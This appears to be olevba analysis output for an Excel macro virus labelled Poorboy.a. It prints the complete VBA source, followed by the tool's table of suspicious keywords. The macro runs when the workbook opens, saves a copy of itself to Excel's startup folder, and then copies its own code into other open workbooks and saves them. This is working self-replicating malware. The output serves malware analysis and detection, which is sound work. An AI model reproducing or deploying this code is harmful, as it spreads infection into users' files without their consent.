olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Poorboy.a-b838048b0fcffba5b350a498e65eceda24ee23b4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Poorboy.a-b838048b0fcffba5b350a498e65eceda24ee23b4 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Const Sn = "Books.xls"
Sub CreatSelf(r As String)
    On Error Resume Next
    Application.DisplayAlerts = False
    LookAdd
    Application.ActiveWorkbook.SaveAs r
    Application.DisplayAlerts = True
    On Error GoTo 0
End Sub

Private Sub Workbook_NewSheet(ByVal Sh As Object)

End Sub

Private Sub Workbook_Open()
    On Error Resume Next
    Application.ScreenUpdating = False
    r = Application.StartupPath & "\" & Sn
    s = Application.Workbooks(Sn).Name
    If s = "" Then
        cf = ActiveWorkbook.Name
        Application.Workbooks.Add
        CreatSelf (r)
        Workbooks(cf).Activate
    End If
      
    Application.ScreenUpdating = True
    On Error GoTo 0
End Sub
Function LookAdd() As Boolean
    On Error Resume Next
    If ThisWorkbook.Name = ActiveWorkbook.Name Then GoTo NoAdd
    With ActiveWorkbook.VBProject.VBComponents("ThisWorkbook")
        s = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
        m = .CodeModule.CountOfLines
        If m >= s Then GoTo NoAdd
        Do While .CodeModule.CountOfLines > 0
            .CodeModule.DeleteLines 1, .CodeModule.CountOfLines
        Loop
        For i = 1 To s
            sl = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(i, 1)
            .CodeModule.InsertLines i, sl
        Next i
        ap = ActiveWorkbook.Path
        If ap <> "" Then ActiveWorkbook.Save
    End With
YesAdd:
    LookAdd = True
    On Error GoTo 0
    Exit Function
NoAdd:
    LookAdd = False
    On Error GoTo 0
End Function

-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Poorboy.a-b838048b0fcffba5b350a498e65eceda24ee23b4 - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Poorboy.a-b838048b0fcffba5b350a498e65eceda24ee23b4 - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Poorboy.a-b838048b0fcffba5b350a498e65eceda24ee23b4 - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

